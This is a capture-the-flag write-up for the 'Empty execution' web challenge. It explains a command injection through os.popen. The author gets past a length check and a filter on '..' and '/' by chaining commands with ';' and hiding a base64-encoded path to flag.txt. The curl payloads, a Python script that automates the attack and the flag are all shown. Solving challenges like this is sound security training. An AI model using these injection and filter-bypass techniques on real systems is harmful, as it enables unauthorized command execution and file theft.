### CTF: BRAEKERCTF


### Challenge:

- Empty execution [web]


### Challenge 1: Empty execution

 ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/dbd88f21-d29a-4ada-a85a-36e21201fa20)

- The goal of this challenge is to read flag.txt.After reading the source code,I noticed that the webpage is vulnerable to command injection because the
the os method `popen` executes shell commands on the server.

  
            # Execute binary if it exists and is executable
            out = os.popen(command).read()
            return jsonify({'message': 'Command output: ' + str(out)}), 200
### Security checks
- But the code filters some characters from the user input e.git raises an alert `Hacking attempt detected` if the user input contains '..' or '/'.
It also raises a `command too short` error if the user input is lesser than 5 .

        # Length check
        if len(command) < 5:
            return jsonify({'message': 'Command too short'}), 501

        # Perform security checks
        if '..' in command or '/' in command:
            return jsonify({'message': 'Hacking attempt detected'}), 501

- Lastly, it uses the split() method to cut characters before `[space]`, tag it as the variable executable_to_run and use os.access()
to check if the binary or executable can be executed.If it cannot be executed,it raises an error message `Not implemented`.
    
       # Check if we can execute the binary
            if os.access(executable_to_run, os.X_OK):
    
                # Execute binary if it exists and is executable
                out = os.popen(command).read()
                return jsonify({'message': 'Command output: ' + str(out)}), 200
    
        return jsonify({'message': 'Not implemented'}), 501

### Crafting a Payload

- The first step is to bypass the os.access() filter by ensuring that it returns True,I bypassed it with '. ' because the characters '.' and '..' are present in a linux directory.'.' is a link to your current directory and '..' is a link to the parent directory.I added space after '.' to allow the code split '.' and a couple of gibberish text to bypass the length check.
   
      $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". zzzzz"}' -H 'Content-Type: application/json'                                                    
      {"message":"Command output: "}

- Now we can execute commands,but I placed ";" after the space to execute close the first statement and execute nother statement.The next step was to find binaries to read the flag.I was able to use `which` to locate binaries and it worked.The `which` binary is used to find binaries path.Using which to find base64 and echo binaries' path confirmed the existence of the binaries on the server.

      $ curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;which base64;which echo"}' -H 'Content-Type: application/json'
      {"message":"Command output: /bin/base64\n/bin/echo\n"}

- Now we can craft a payload with base64 and echo,I was able to craft this payload `base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)`.I encoded '../flag.txt' with base64 since flag.txt is not present in the current directory, we will need to move up one directory and .. and / are both filtered by the code.Echo pipes it to base64 which decodes it and the process is executed with $().Base64 can read files passed to it and return it in base64 encoded text.The flag is encoded and returned back to us in base64 text.

        curl -X POST https://braekerctf-empty-execution.chals.io/run_command -d '{"command": ". ;base64 $(echo 'Li4vZmxhZy50eHQK' | base64 -d)"}' -H 'Content-Type: application/json'
      {"message":"Command output: YnJja3tDaDMzcl9VcF9CdWRkWV9KVTV0XzN4M0N1dDNfNF9EMXJlQ1Qwcnl9\n"} 

- I automated it with python to receive the flag and decode it.

      #! /usr/bin/env python3
      import requests
      import json
      import base64
      headers = {"Content-Type": "application/json"}
      data = data = {'command':'. ;base64 $(echo \'Li4vZmxhZy50eHQK\' | base64 -d)'}
      response = requests.post("https://braekerctf-empty-execution.chals.io/run_command",data=json.dumps(data),headers=headers).text
      encodedFlag=json.loads(response)["message"].split('Command output: ')[1].encode()
      print(base64.b64decode(encodedFlag).decode())

- Flag

      $ ./emptyexec.py
        brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}
